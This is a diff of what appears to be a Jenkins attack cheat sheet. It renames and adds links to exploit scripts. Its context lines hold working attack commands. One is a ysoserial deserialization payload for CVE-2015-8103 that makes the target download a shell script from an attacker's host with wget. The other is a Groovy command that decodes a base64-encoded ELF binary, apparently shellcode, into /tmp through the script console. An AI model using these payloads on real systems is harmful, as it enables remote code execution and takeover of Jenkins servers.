@@ -5,7 +5,7 @@ Remote Code Execution
 Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
 ---------------------------------------------------------------------------
 Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
-Then RCE using [this script](./rce/pwn_jenkins.py):
+Then RCE using [this script](./rce/jenkins_rce_cve-2015-8103_deser.py):
 
 ```bash
 java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
@@ -155,6 +155,7 @@ For multiline shell commands, use the following shell syntax trick (example incl
 def proc="sh -c \$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d > /tmp/65001".execute();
 ```
 
+Automate it using [this script](./rce/jenkins_rce_admin_script.py).
 
 Reverse shell from Groovy
 -------------------------
